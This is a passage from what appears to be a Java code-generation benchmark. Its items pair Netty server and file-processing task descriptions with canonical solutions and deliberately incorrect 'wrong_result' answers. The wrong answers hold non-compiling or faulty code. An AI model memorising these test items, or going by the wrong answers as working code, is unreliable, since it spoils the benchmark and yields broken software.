    "Canonical_solution": "import com.yeetor.server.handler.TCPHandler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class AndroidControlServer {\n\n    private EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n    public void listen(int port) throws InterruptedException {\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(\"tcp\", new TCPHandler());\n                        }\n                    });\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class AndroidControlServer {\n    private final NioEventLoopGroup bossGroup;\n    private final NioEventLoopGroup workerGroup;\n    private Channel channel;\n\n    public AndroidControlServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n    }\n\n    public void listen(int port) throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new AndroidControlHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        channel = future.channel();\n        future.channel().closeFuture().sync();\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    private class AndroidControlHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ByteBuf in = (ByteBuf) msg;\n            try {\n                // Process incoming data\n            } finally {\n                in.release();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 186,
    "Instruction": "Task Description: Implement an abstract HTTP/2 server transport class using Java Netty framework that handles TCP communication, manages server lifecycle (start/stop), and supports SSL encryption.\n\nClass Description: AbstractHttp2ServerTransport is an abstract base class for creating HTTP/2 server transports using Netty. It manages server bootstrap configuration, event loop groups, and provides core server functionality including SSL support and connection management.\n\nAttributes:\n- LOGGER: Logger - Logger instance for logging server events and errors\n- serverBootstrap: ServerBootstrap - Netty server bootstrap instance for configuring and starting the server\n- bizGroup: EventLoopGroup - Event loop group for handling business logic and I/O operations\n- transportConfig: ServerTransportConfig - Configuration object containing server parameters like host, port, and various TCP options\n\nMethods:\n- AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) -> None - Constructor that initializes the transport with configuration\n- start() -> boolean - Starts the HTTP/2 server, initializes event loop groups, configures server bootstrap with TCP options and handlers, and binds to the specified host/port. Returns true if successful\n- stop() -> None - Shuts down the server gracefully, closing event loop groups and releasing resources\n- (inherited methods from ServerTransport superclass would be listed here if applicable)\n\nInput:\n- For constructor: ServerTransportConfig object containing server configuration parameters\n- For start(): None (uses internal state)\n- For stop(): None (uses internal state)\n\nOutput:\n- For start(): boolean indicating success/failure of server startup\n- For stop(): None (performs cleanup operations)",
    "Canonical_solution": "import com.alipay.sofa.rpc.core.exception.SofaRpcRuntimeException;\nimport com.alipay.sofa.rpc.log.LogCodes;\nimport com.alipay.sofa.rpc.log.Logger;\nimport com.alipay.sofa.rpc.log.LoggerFactory;\nimport com.alipay.sofa.rpc.server.http.HttpServerHandler;\nimport com.alipay.sofa.rpc.transport.ServerTransport;\nimport com.alipay.sofa.rpc.transport.ServerTransportConfig;\nimport com.alipay.sofa.rpc.transport.netty.NettyHelper;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.WriteBufferWaterMark;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\n\nimport java.net.InetSocketAddress;\n\npublic abstract class AbstractHttp2ServerTransport extends ServerTransport {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(AbstractHttp2ServerTransport.class);\n\n    private volatile ServerBootstrap serverBootstrap;\n    private EventLoopGroup bizGroup;\n\n    protected AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) {\n        super(transportConfig);\n    }\n\n    @Override\n    public boolean start() {\n        if (serverBootstrap != null) {\n            return true;\n        }\n        synchronized (this) {\n            if (serverBootstrap != null) {\n                return true;\n            }\n            boolean flag = false;\n            SslContext sslCtx = SslContextBuilder.build();\n\n            EventLoopGroup bossGroup = NettyHelper.getServerBossEventLoopGroup(transportConfig);\n            HttpServerHandler httpServerHandler = (HttpServerHandler) transportConfig.getServerHandler();\n            bizGroup = NettyHelper.getServerBizEventLoopGroup(transportConfig, httpServerHandler.getBizThreadPool());\n\n            serverBootstrap = new ServerBootstrap();\n            serverBootstrap.group(bossGroup, bizGroup)\n                .channel(transportConfig.isUseEpoll() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, transportConfig.getBacklog())\n                .option(ChannelOption.SO_REUSEADDR, transportConfig.isReuseAddr())\n                .option(ChannelOption.RCVBUF_ALLOCATOR, NettyHelper.getRecvByteBufAllocator())\n                .option(ChannelOption.ALLOCATOR, NettyHelper.getByteBufAllocator())\n                .childOption(ChannelOption.SO_KEEPALIVE, transportConfig.isKeepAlive())\n                .childOption(ChannelOption.TCP_NODELAY, transportConfig.isTcpNoDelay())\n                .childOption(ChannelOption.SO_RCVBUF, 8192 * 128)\n                .childOption(ChannelOption.SO_SNDBUF, 8192 * 128)\n                .handler(new LoggingHandler(LogLevel.DEBUG))\n                .childOption(ChannelOption.ALLOCATOR, NettyHelper.getByteBufAllocator())\n                .childOption(ChannelOption.WRITE_BUFFER_WATER_MARK, new WriteBufferWaterMark(\n                    transportConfig.getBufferMin(), transportConfig.getBufferMax()))\n                .childHandler(new Http2ServerChannelInitializer(bizGroup, sslCtx,\n                    httpServerHandler, transportConfig.getPayload()));\n\n            ChannelFuture future = serverBootstrap.bind(\n                new InetSocketAddress(transportConfig.getHost(), transportConfig.getPort()));\n            ChannelFuture channelFuture = future.addListener(new ChannelFutureListener() {\n                @Override\n                public void operationComplete(ChannelFuture future) throws Exception {\n                    if (future.isSuccess()) {\n                        if (LOGGER.isInfoEnabled()) {\n                            LOGGER.info(\"HTTP/2 Server bind to {}:{} success!\",\n                                transportConfig.getHost(), transportConfig.getPort());\n                        }\n                    } else {\n                        LOGGER.error(LogCodes.getLog(LogCodes.ERROR_HTTP2_BIND, transportConfig.getHost(),\n                            transportConfig.getPort()));\n                        stop();\n                    }\n                }\n            });\n\n            try {\n                channelFuture.await();\n                if (channelFuture.isSuccess()) {\n                    flag = Boolean.TRUE;\n                } else {\n                    throw new SofaRpcRuntimeException(LogCodes.getLog(LogCodes.ERROR_START_SERVER, \"HTTP/2\"),\n                        future.cause());\n                }\n            } catch (InterruptedException e) {\n                LOGGER.error(e.getMessage(), e);\n            }\n            return flag;\n        }\n    }\n\n    @Override\n    public void stop() {\n        if (LOGGER.isInfoEnabled()) {\n            LOGGER.info(\"Shutdown the SOFA RPC HTTP/2 server transport now...\");\n        }\n        NettyHelper.closeServerBossEventLoopGroup(transportConfig);\n        if (bizGroup != null) {\n            bizGroup.shutdownGracefully();\n        }\n        serverBootstrap = null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public abstract class AbstractHttp2ServerTransport {\n    protected final Logger LOGGER;\n    protected final ServerBootstrap serverBootstrap;\n    protected final EventLoopGroup bossGroup;\n    protected final EventLoopGroup bizGroup;\n    protected final ServerTransportConfig transportConfig;\n\n    public AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) {\n        this.transportConfig = transportConfig;\n        this.LOGGER = LoggerFactory.getLogger(AbstractHttp2ServerTransport.class);\n        this.bizGroup = new NioEventLoopGroup();\n        this.bossGroup = new NioEventLoopGroup(1);\n        this.serverBootstrap = new ServerBootstrap();\n    }\n\n    public boolean start() {\n        serverBootstrap.group(bossGroup, bizGroup);\n        serverBootstrap.channel(NioServerSocketChannel.class);\n        serverBootstrap.childOption(ChannelOption.SO_BACKLOG, transportConfig.getBacklog());\n        serverBootstrap.childOption(ChannelOption.TCP_NODELAY, transportConfig.isTcpNoDelay());\n        serverBootstrap.childOption(ChannelOption.SO_REUSEADDR, transportConfig.isReuseAddress());\n        if (transportConfig.isSslEnabled()) {\n            SslContext sslContext = SslContextFactory.getServerContext(transportConfig.getSslContextConfig());\n            serverBootstrap.childHandler(new ChannelInitializer<Channel>() {\n                @Override\n                protected void initChannel(Channel ch) throws Exception {\n                    ch.pipeline().addLast(sslContext.newHandler(ch.alloc()));\n                    ch.pipeline().addLast(new Http2ServerHandler());\n                }\n            });\n        } else {\n            serverBootstrap.childHandler(new ChannelInitializer<Channel>() {\n                @Override\n                protected void initChannel(Channel ch) throws Exception {\n                    ch.pipeline().addLast(new Http2ServerHandler());\n                }\n            });\n        }\n        ChannelFuture future = serverBootstrap.bind(transportConfig.getHost(), transportConfig.getPort()).sync();\n        return future.isSuccess();\n    }\n\n    public void stop() {\n        if (serverBootstrap != null) {\n            serverBootstrap.releaseExternalResources();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (bizGroup != null) {\n            bizGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 187,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process time-related requests.\n\nClass Description: The TimeServer class is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses Netty's event-driven architecture to efficiently handle multiple concurrent connections. The server processes incoming requests through a pipeline of handlers and responds with time-related information.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nconstructor: TimeServer(int port) -> void - Initializes the server with the specified port number\nrun: run() -> void - Starts the server, binds it to the specified port, and begins accepting client connections. This method handles the server's lifecycle including startup, operation, and graceful shutdown. Throws Exception if any error occurs during server operation.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class TimeServer {\n\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new TimeEncoder());\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class TimeServer {\n    private final int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ch.pipeline().addLast(new StringDecoder());\n                     ch.pipeline().addLast(new StringEncoder());\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 1024)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private class TimeServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            String request = (String) msg;\n            if (\"time\".equals(request)) {\n                String currentTime = new java.util.Date().toString();\n                ctx.writeAndFlush(currentTime);\n            }\n            ctx.close();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) {\n        new TimeServer(8080).run();\n    }\n}"
  },
  {
    "Task_id": 19,
    "Instruction": "Task Description: Implement a Java class that processes large files efficiently using memory-mapped file operations (FileChannel and MappedByteBuffer) to calculate statistics (min, max, sum, count) for numeric values associated with named fields in the file.\n\nClass Description: FileChannelProcessor is a utility class that processes large files in chunks using memory-mapped buffers, calculating statistics for named numeric values in a thread-safe manner using concurrent data structures.\n\nAttributes:\n- mins: ConcurrentHashMap<ByteBuffer, Integer> - Stores minimum values for each named field\n- maxs: ConcurrentHashMap<ByteBuffer, Integer> - Stores maximum values for each named field\n- sums: ConcurrentHashMap<ByteBuffer, Integer> - Stores sum of values for each named field\n- counts: ConcurrentHashMap<ByteBuffer, Integer> - Stores count of values for each named field\n\nMethods:\n- processChunk(MappedByteBuffer chunk, long chunkSize) -> void - Processes a memory-mapped file chunk to calculate statistics for named numeric values\n  - Input Parameters:\n    - chunk: MappedByteBuffer - Memory-mapped buffer containing file data\n    - chunkSize: long - Size of the chunk to process\n- processFile(Path filePath) -> void - Processes the entire file by dividing it into chunks and calculating statistics\n  - Input Parameters:\n    - filePath: Path - Path to the file to be processed\n  - Throws: IOException - If there are file I/O errors",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.HashMap;\nimport java.util.IntSummaryStatistics;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class FileChannelProcessor {\n\n    private static final ConcurrentHashMap<ByteBuffer, Integer> mins = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> maxs = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> sums = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> counts = new ConcurrentHashMap<>();\n\n    public static void processChunk(MappedByteBuffer chunk, long chunkSize) {\n        chunk.load();\n        HashMap<ByteBuffer, IntSummaryStatistics> values = new HashMap<>();\n\n        long end = chunk.position() + chunkSize;\n        int value = 0;\n        byte b = 0;\n        boolean negate = false;\n        long nameStart = 0;\n        long nameEnd = 0;\n        int nameLength = 0;\n        while (chunk.position() < end) {\n            nameStart = chunk.position();\n            b = chunk.get();\n            while (b != ';') {\n                b = chunk.get();\n            }\n            nameEnd = chunk.position() - 1;\n            nameLength = (int) (nameEnd - nameStart);\n            ByteBuffer nameBuffer = ByteBuffer.allocate(nameLength);\n            chunk.get(chunk.position() - nameLength - 1, nameBuffer.array(), 0, nameLength);\n\n            value = 0;\n            b = chunk.get();\n            negate = false;\n            while (b != '\\n') {\n                if (b == '.') {\n                    b = chunk.get();\n                    continue;\n                }\n                else if (b == '-') {\n                    negate = true;\n                    b = chunk.get();\n                    continue;\n                }\n                value = value * 10 + (b - '0');\n                b = chunk.get();\n            }\n            if (negate) {\n                value = -value;\n            }\n\n            if (values.containsKey(nameBuffer)) {\n                values.get(nameBuffer).accept(value);\n            }\n            else {\n                IntSummaryStatistics stats = new IntSummaryStatistics();\n                stats.accept(value);\n                values.put(nameBuffer, stats);\n            }\n        }\n\n        for (ByteBuffer nameBfr : values.keySet()) {\n            IntSummaryStatistics stats = values.get(nameBfr);\n            mins.compute(nameBfr, (k, v) -> v == null ? stats.getMin() : Math.min(v, stats.getMin()));\n            maxs.compute(nameBfr, (k, v) -> v == null ? stats.getMax() : Math.max(v, stats.getMax()));\n            sums.compute(nameBfr, (k, v) -> v == null ? (int) stats.getSum() : (v + (int) stats.getSum()));\n            counts.compute(nameBfr, (k, v) -> v == null ? (int) stats.getCount() : (v + (int) stats.getCount()));\n        }\n    }\n\n    public static void processFile(Path filePath) throws IOException {\n        FileChannel fc = FileChannel.open(filePath);\n        long fileSize = fc.size();\n        int numProcessors = Runtime.getRuntime().availableProcessors();\n        int numChunks = numProcessors * 2000;\n        long chunkLimit = fileSize / numChunks;\n        long chunkStart = 0;\n        long chunkEnd = chunkLimit;\n        ByteBuffer bb = ByteBuffer.allocateDirect(128);\n\n        while (chunkEnd < fileSize) {\n            fc.position(chunkEnd);\n            bb.clear();\n            fc.read(bb);\n            bb.flip();\n            while (bb.get() != '\\n' && bb.position() < bb.limit()) {\n            }\n            chunkEnd = chunkEnd + bb.position();\n            if (chunkEnd > fileSize) {\n                chunkEnd = fileSize - 1;\n            }\n\n            long chunkSize = chunkEnd - chunkStart;\n            if (chunkSize < 1) {\n                break;\n            }\n\n            MappedByteBuffer chunk = fc.map(FileChannel.MapMode.READ_ONLY, chunkStart, chunkSize);\n            processChunk(chunk, chunkSize);\n            chunkStart = chunkEnd;\n            chunkEnd = chunkEnd + chunkLimit;\n            if (chunkEnd > fileSize) {\n                chunkEnd = fileSize - 1;\n            }\n        }\n        fc.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class FileChannelProcessor {\n    private final ConcurrentHashMap<ByteBuffer, Integer> mins = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> maxs = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> sums = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> counts = new ConcurrentHashMap<>();\n\n    public void processChunk(MappedByteBuffer chunk, long chunkSize) {\n        int pos = 0;\n        while (pos < chunkSize) {\n            int fieldNameLength = chunk.getInt(pos);\n            pos += 4;\n            byte[] fieldNameBytes = new byte[fieldNameLength];\n            chunk.get(fieldNameBytes, pos, fieldNameLength);\n            pos += fieldNameLength;\n            int value = chunk.getInt(pos);\n            pos += 4;\n\n            ByteBuffer fieldNameKey = ByteBuffer.wrap(fieldNameBytes);\n            mins.put(fieldNameKey, Math.min(mins.getOrDefault(fieldNameKey, Integer.MAX_VALUE), value));\n            maxs.put(fieldNameKey, Math.max(maxs.getOrDefault(fieldNameKey, Integer.MIN_VALUE), value));\n            sums.put(fieldNameKey, sums.getOrDefault(fieldNameKey, 0) + value);\n            counts.put(fieldNameKey, counts.getOrDefault(fieldNameKey, 0) + 1);\n        }\n    }\n\n    public void processFile(Path filePath) throws IOException {\n        try (FileChannel channel = FileChannel.open(filePath)) {\n            long fileSize = channel.size();\n            long chunkSize = 1024 * 1024; // 1MB chunk size\n            long offset = 0;\n            while (offset < fileSize) {\n                long chunkEnd = Math.min(offset + chunkSize, fileSize);\n                MappedByteBuffer chunk = channel.map(FileChannel.MapMode.READ_ONLY, offset, chunkEnd - offset);\n                processChunk(chunk, chunkEnd - offset);\n                offset += chunkSize;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 190,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket chat server using Netty framework to handle TCP connections and manage client communications.\n\nClass Description: The WebSocketChatServer class is responsible for setting up and running a Netty-based TCP server that handles WebSocket connections for chat functionality. It manages server resources and gracefully shuts down when needed.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nWebSocketChatServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() throws Exception -> None - Starts the server, binds it to the specified port, and keeps it running until shutdown is requested. Manages server resources and ensures proper cleanup.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class WebSocketChatServer {\n\n    private int port;\n\n    public WebSocketChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new WebSocketChatServerInitializer())\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            \n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class WebSocketChatServer {\n    private final int port;\n    private final Set<Channel> clients = new CopyOnWriteArraySet<>();\n\n    public WebSocketChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new WebSocketServerProtocolHandler(\"/chat\"));\n                     p.addLast(new ChatWebSocketHandler(clients));\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            Channel ch = b.bind(port).sync().channel();\n            System.out.println(\"WebSocket chat server started on port \" + port);\n            ch.closeFuture().await();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static class ChatWebSocketHandler extends SimpleChannelInboundHandler<TextWebSocketFrame> {\n        private final Set<Channel> clients;\n\n        ChatWebSocketHandler(Set<Channel> clients) {\n            this.clients = clients;\n        }\n\n        @Override\n        public void handlerAdded(ChannelHandlerContext ctx) {\n            clients.add(ctx.channel());\n            System.out.println(\"Client connected\");\n        }\n\n        @Override\n        public void handlerRemoved(ChannelHandlerContext ctx) {\n            clients.remove(ctx.channel());\n            System.out.println(\"Client disconnected\");\n        }\n\n        @Override\n        protected void messageReceived(ChannelHandlerContext ctx, TextWebSocketFrame msg) {\n            String message = msg.text();\n            System.out.println(\"Received: \" + message);\n            for (Channel client : clients) {\n                if (client != ctx.channel()) {\n                    client.writeAndFlush(new TextWebSocketFrame(message));\n                }\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8080;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        new WebSocketChatServer(port).run();\n    }\n}"
  },
  {
    "Task_id": 191,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests and responses.\n\nClass Description: The NettyTcpServer class provides functionality to start and stop a Netty-based TCP server that listens for HTTP requests on a specified port and responds with a predefined message. It manages server resources and lifecycle.\n\nAttributes:\n- ctx: ApplicationContext - The Micronaut application context for dependency injection and configuration\n- serverLoop: EventLoopGroup - The Netty event loop group that handles server I/O operations\n- server: ServerSocketChannel - The server socket channel that listens for incoming connections\n\nMethods:\n- startServer(int port) -> void - Starts the TCP server on the specified port. Initializes the server with an event loop group, configures the channel pipeline with HTTP codec and handler, and binds to the given port.\n  Input: port (int) - The port number to bind the server to\n  Output: None (throws Exception if server fails to start)\n\n- stopServer() -> void - Stops the server gracefully by shutting down the event loop group and closing the application context.\n  Input: None\n  Output: None\n\n- getPort() -> int - Returns the port number the server is bound to, or -1 if the server is not running.\n  Input: None\n  Output: int - The port number or -1 if server is not active",
    "Canonical_solution": "import io.micronaut.context.ApplicationContext;\nimport io.micronaut.http.HttpRequest;\nimport io.micronaut.http.body.CloseableAvailableByteBody;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.ByteBufAllocator;\nimport io.netty.buffer.ByteBufUtil;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.ServerSocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.EmptyHttpHeaders;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport java.util.Map;\n\npublic class NettyTcpServer {\n\n    private ApplicationContext ctx;\n    private EventLoopGroup serverLoop;\n    private ServerSocketChannel server;\n\n    public void startServer(int port) throws Exception {\n        ctx = ApplicationContext.run(Map.of(\"spec.name\", \"NettyTcpServer\"));\n        serverLoop = new NioEventLoopGroup(1);\n        server = (ServerSocketChannel) new ServerBootstrap()\n            .group(serverLoop)\n            .channel(NioServerSocketChannel.class)\n            .localAddress(port)\n            .childHandler(new ChannelInitializer<>() {\n                FullHttpResponse response;\n\n                @Override\n                public void handlerAdded(ChannelHandlerContext ctx) {\n                    ByteBuf resp = ctx.alloc().buffer();\n                    ByteBufUtil.writeAscii(resp, \"bar\");\n                    response = new DefaultFullHttpResponse(\n                        HttpVersion.HTTP_1_1, \n                        HttpResponseStatus.OK, \n                        resp, \n                        new DefaultHttpHeaders().add(HttpHeaderNames.CONTENT_LENGTH, resp.readableBytes()), \n                        EmptyHttpHeaders.INSTANCE\n                    );\n                }\n\n                @Override\n                protected void initChannel(@NonNull Channel ch) {\n                    ch.pipeline()\n                        .addLast(new HttpServerCodec())\n                        .addLast(new ChannelInboundHandlerAdapter() {\n                            boolean inBody = false;\n\n                            @Override\n                            public void channelRead(@NonNull ChannelHandlerContext ctx, @NonNull Object msg) throws Exception {\n                                if (!inBody) {\n                                    inBody = true;\n                                    if (!(msg instanceof FullHttpResponse)) {\n                                        return;\n                                    }\n                                }\n                                ((HttpContent) msg).release();\n                                if (msg instanceof LastHttpContent) {\n                                    ctx.writeAndFlush(new DefaultFullHttpResponse(\n                                        response.protocolVersion(),\n                                        response.status(),\n                                        response.content().retainedSlice(),\n                                        response.headers(),\n                                        response.trailingHeaders()\n                                    ));\n                                    inBody = false;\n                                }\n                            }\n                        });\n                }\n            })\n            .bind().syncUninterruptibly().channel();\n    }\n\n    public void stopServer() {\n        if (serverLoop != null) {\n            serverLoop.shutdownGracefully();\n        }\n        if (ctx != null) {\n            ctx.close();\n        }\n    }\n\n    public int getPort() {\n        return server != null ? server.localAddress().getPort() : -1;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
